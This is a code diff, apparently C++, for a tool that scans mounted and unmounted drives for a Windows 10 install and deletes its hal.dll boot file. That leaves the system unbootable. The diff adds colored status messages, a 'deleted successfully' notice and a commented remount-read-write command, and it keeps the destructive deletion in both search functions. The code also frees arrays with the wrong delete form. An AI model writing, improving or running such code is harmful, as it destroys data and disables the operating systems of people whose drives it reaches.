@@ -26,6 +26,8 @@
 #endif
 
 #define RED    "\x1b[91m"
+#define GREEN  "\x1b[92m"
+#define BLUE   "\x1b[94m"
 #define NORMAL "\x1b[0m"
 
 static void do_nothing(auto n, ...) {}
@@ -141,8 +143,8 @@ void DeleteIf(bool cond, const char* path) {
 
 void MountedSearch() {
 #ifndef _WIN32
-  print("Looking for mounted drives...\n");
-  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 != \"\"' > drive_list";
+  print(BLUE "Looking for mounted drives..." NORMAL "\n\n");
+  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 != \"\"' > drive_list";
   system(list_drives);
   FILE* drive_list = fopen("drive_list", "r");
   assert(drive_list != nullptr);
@@ -158,14 +160,16 @@ void MountedSearch() {
     strcat(name, "/Windows/System32/D3D12.dll");
     print("Looking for file: %s\n", name);
 
-    stat buffer;
+    struct stat buffer;
     if (stat(name, &buffer) == 0) {
       print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       print("Deleting %s ...\n", del);
-      remove(del);
+      if (remove(del) == 0)
+        print(GREEN "INFO: File successfully deleted" NORMAL " \n");
+      // sudo mount -o remount,rw '/media/user/4452ED3952ED307A'
       delete del;
     }
     delete name;
@@ -178,8 +182,8 @@ void MountedSearch() {
 
 void UnmountedSearch() {
 #ifndef _WIN32
-  print("Looking for unmounted drives...\n");
-  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 == \"\"' > drive_list";
+  print(BLUE "Looking for unmounted drives..." NORMAL "\n\n");
+  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 == \"\"' > drive_list";
   system(list_drives);
   FILE* drive_list = fopen("drive_list", "r");
   assert(drive_list != nullptr);
@@ -204,7 +208,7 @@ void UnmountedSearch() {
     fclose(media);
     remove("media");
     if (mounted != 2) {
-      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n", drive);
+      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n\n", drive);
       continue;
     }
 
@@ -217,14 +221,15 @@ void UnmountedSearch() {
     strcat(name, "/Windows/System32/D3D12.dll");
     print("Looking for file: %s\n", name);
 
-    stat buffer;
+    struct stat buffer;
     if (stat(name, &buffer) == 0) {
       print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
       print("Deleting %s ...\n", del);
-      remove(del);
+      if (remove(del) == 0)
+        print(GREEN "INFO: File successfully deleted" NORMAL " \n");
       delete del;
     }
     delete name;
